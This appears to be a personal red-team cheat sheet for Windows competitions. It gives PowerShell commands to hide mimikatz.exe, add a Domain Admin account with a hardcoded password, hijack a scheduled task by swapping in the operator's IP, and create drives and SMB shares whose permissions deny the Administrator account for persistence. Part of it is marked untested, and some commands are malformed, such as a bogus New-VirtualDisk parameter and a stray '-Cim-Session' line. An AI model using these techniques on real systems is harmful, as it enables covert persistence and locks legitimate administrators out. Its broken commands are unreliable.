# Red Windows

Website 
`Ctrl + Shift + R` - cache refresh pages to ensure last game does not misinform as to current context

Change the keyboard layout - check in scope if so force any new user to have a weird keyboard layout
```powershell
Set-WinUserLanguageList -Force 'en-US'
```

Hiding binaries
```powershll
attrib +h mimikatz.exe
```

Add a Domain Admin
```powershell
# Check the password requirements before!
dsadd user "CN=John,CN=Users,DC=object,DC=local" -samid John -pwd johnspassword123! -display "John" -pwdneverexpires yes -memberof "DC=Domain Admins,CN=Users,DC=object,DC=local"
```

Assimilate a schduledtask
```powershell
# Find task and its excution path to hijack
get-scheduledtask | findstr /v Disabled
$task = get-scheduledtask -taskname <name>
$task | fl
$task.Actions.Execute | fl
$content = Get-Content -Path 'C:\file'
$newContent = $content -replace '<adversary-ip>', '<your-ip>'
$newContent | Set-Content -Path 'C:\file'
```


I NEED TO TEST THIS:

You may want to create all the secondary drives or all the drives possible to block others from using any of the drives. 
```powershell
$persistenceUser = "User1"

for ($i=0; $i -lt 26; $i++) {
  $driveLetter = [char]($i + 65) + ":"
  if (!(Get-Volume | Where-Object DriveLetter -eq $driveLetter)) {
    $newDisk = New-VirtualDisk -DriveLetter $driveLetter -Size 25MB
    $acl = Get-Acl -Path $newDisk.DriveLetter
    $persistenceUserRights = [System.Security.AccessControl.FileSystemRights]"FullControl"
    $persistenceUserAccessRule = New-Object System.Security.AccessControl.FileSystemAccessRule($persistenceUser, $persistenceUserRights, "Allow")
    $acl.SetAccessRule($persistenceUserAccessRule)
    $otherUsersRights = [System.Security.AccessControl.FileSystemRights]"FullControl"
    $otherUsersAccessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Administrator", $otherUsersRights, "Deny")
    $acl.SetAccessRule($otherUsersAccessRule)
    Set-Acl -Path $newDisk.DriveLetter -AclObject $acl
  }
}

```

Create a file share - the longer the path for copy and paste and shell nightmares
```powershell
#

# -ConcurrentUserLimit to prevent hacky breaking into destroy the share 

New-SmbShare -Name MyFileShare -Path $goodPath -FullAccess $persistenceUser -EncryptData $True -ConcurrentUserLimit 1 -ContinuouslyAvailable -Temporary
# You can set up an inital connection to a remote host with output from
#  New-CimSession Get-CimSession
-Cim-Session 


# Add to known adversary accounts -NoAccess Administrator

$Parameters = @{
    Name = '$Name'
    Path = $goodPath
    FullAccess = 'Contoso\Administrator', 'Contoso\Contoso-HV1$'
    EncryptData = $True
    Temporary = $True
    ContinuouslyAvailable = $True
    NoAccess = 'Administrator' # Prevent access administrator - create persistence user to access
}
New-SmbShare @Parameters
```